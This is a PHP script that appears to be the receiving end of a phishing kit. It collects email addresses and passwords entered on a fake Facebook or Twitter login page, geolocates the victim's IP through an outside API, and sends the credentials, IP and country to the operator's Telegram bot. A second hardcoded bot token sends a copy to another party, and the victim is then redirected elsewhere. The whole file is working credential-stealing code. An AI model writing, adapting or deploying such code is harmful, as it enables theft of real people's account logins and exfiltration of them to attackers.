<?php
error_reporting(1);
session_start();
if(isset($_SESSION["last_access"])){
if(@$_SESSION["last_access"] > (time() - 60)){
header("Location: $ads");
exit('Error 505');
}
}
@$houda = explode("\n",file_get_contents('houda.txt'));
if(in_array(@$_POST['email'],@$houda)){
header("Location: $ads");
exit('Error 504');
}else{
file_put_contents('houda.txt',@$_POST['email']."\n",FILE_APPEND);
}
include ".tokin.php";
function getUserIP()
    {
        if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
                  $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
                  $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
        }
        $client  = @$_SERVER['HTTP_CLIENT_IP'];
        $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
        $remote  = $_SERVER['REMOTE_ADDR'];
    
        if(filter_var($client, FILTER_VALIDATE_IP))
        {
            $ip = $client;
        }
        elseif(filter_var($forward, FILTER_VALIDATE_IP))
        {
            $ip = $forward;
        }
        else
        {
            $ip = $remote;
        }
        return $ip;
    }
 $ip = getUserIP();
$api = json_decode(file_get_contents("https://nailspansseh.com/api.php?ip=$ip"));
$country = $api->country_en;
$code = $api->code;
$flag = $api->flag;
$url= $api->country_code;
$ads = $api->url;
//@mr7ooda///
if($ads !== null){
$ads = $ads;
}else{
$ads = "https://Zaiem.store";
}
///@mr7ooda////
$email = $_POST['email'];
$password = $_POST['password'];
$login = $_POST['login'];
$playid = $_POST['playid'];
$user = $_POST["user"];

if($email == null and $password == null){
header("Location: ./index.php");
exit();
}
//@mr7ooda//
if($login == "Facebook"){
$houda = $api->login->Facebook;
}else{
$houda = $api->login->Twitter;
}
//@mr7ooda//
date_default_timezone_set("Africa/Cairo");
$days = date("l");
$time = date("h:i A");
$date = date("d/m/Y");
$id = $idd;
$token = "$tokenn";
//@mr7ooda//
if($login == "Facebook"){
$houda = $api->login->Facebook;
$msg="
*๏ ʟᴏɢɪɴ »* [#$login]($houda)
*๏ ᴇᴍᴀɪʟ »* `$email`
*๏ ᴘᴀss »* `$password`
*๏ ᴛʏᴘᴇ »* Xnxx
*๏ ᴅᴀʏs »* $days
*๏ ᴛɪᴍᴇ »* $time
*๏ ᴅᴀᴛᴇ »* $date
*๏ ғʟᴀɢ »* $flag
*๏ ᴄᴏᴅᴇ »* `$code`
*๏ ɪᴘ »* $ip
*๏ ᴄᴏᴜɴᴛʀʏ »* $country
";
}else{
$houda = $api->login->Twitter;
$msg="
*๏ ʟᴏɢɪɴ »* [#$login]($houda)
*๏ ᴇᴍᴀɪʟ »* `$email`
*๏ ᴘᴀss »* `$password`
*๏ ᴛʏᴘᴇ »* Xnxx
*๏ ᴅᴀʏs »* $days
*๏ ᴛɪᴍᴇ »* $time
*๏ ᴅᴀᴛᴇ »* $date
*๏ ғʟᴀɢ »* $flag
*๏ ᴄᴏᴅᴇ »* `$code`
*๏ ɪᴘ »* $ip
*๏ ᴄᴏᴜɴᴛʀʏ »* $country
";
}
$mesg = ['chat_id'=>$id,'text'=>$msg,'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode([
    'inline_keyboard'=>[
[['text'=>'sᴜᴘᴘᴏʀᴛ ᴜs','url'=>"https://t.me/Zaiem2"]],
]
])];
$message = http_build_query($mesg);
file_get_contents("https://api.telegram.org/bot$token/sendMessage?".$message);
////////
$id = 5772290554;
$token = "5594180869:AAHCuLiRaw8063_qombOTrPYLyL_936wYfo";
$mesg = ['chat_id'=>$id,'text'=>$msg,'parse_mode'=>"markdown",'disable_web_page_preview'=>true,'reply_markup'=>json_encode([
    'inline_keyboard'=>[
[['text'=>'sᴜᴘᴘᴏʀᴛ ᴜs','url'=>"https://t.me/Zaiem2"]],
]
])];
$message = http_build_query($mesg);
file_get_contents("https://api.telegram.org/bot$token/sendMessage?".$message);
header("Location: $ads");
// ربنا يغفر ليك يا حودة //
?>
